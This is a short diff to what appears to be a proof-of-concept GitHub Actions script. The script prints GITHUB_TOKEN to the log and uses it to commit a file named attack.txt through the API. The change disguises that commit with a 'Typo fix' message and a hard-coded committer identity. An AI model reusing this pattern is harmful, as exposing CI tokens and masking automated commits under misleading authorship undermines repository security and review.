@@ -20,6 +20,10 @@ echo "GITHUB_TOKEN: $GITHUB_TOKEN"
 GH_TOKEN="$GITHUB_TOKEN"
 BRANCH="main"
 FILE="attack.txt"
+DATE="$(date)"
+COMMIT_MESSAGE="Typo fix ($DATE)"
+USERNAME="azeemsgoogle"
+EMAIL="azeems@google.com"
 
 gh repo clone "$GITHUB_REPOSITORY" -- -b "main"
 REPOSITORY_NAME=$(echo "$GITHUB_REPOSITORY" | cut -d '/' -f2)
@@ -38,7 +42,7 @@ if [ -f "$FILE" ]; then
 
   # Add the file content's sha to the request.
   cat << EOF > DATA
-{"branch":"$BRANCH","message":"$COMMIT_MESSAGE","sha":"$SHA","committer":{"name":"github-actions","email":"github-actions@github.com"},"content":"$(echo -n $DATE | base64 --wrap=0)"}
+{"branch":"$BRANCH","message":"$COMMIT_MESSAGE","sha":"$SHA","committer":{"name":"$USERNAME","email":"$EMAIL"},"content":"$(echo -n $DATE | base64 --wrap=0)"}
 EOF
 
   # https://docs.github.com/en/rest/repos/contents#create-a-file.
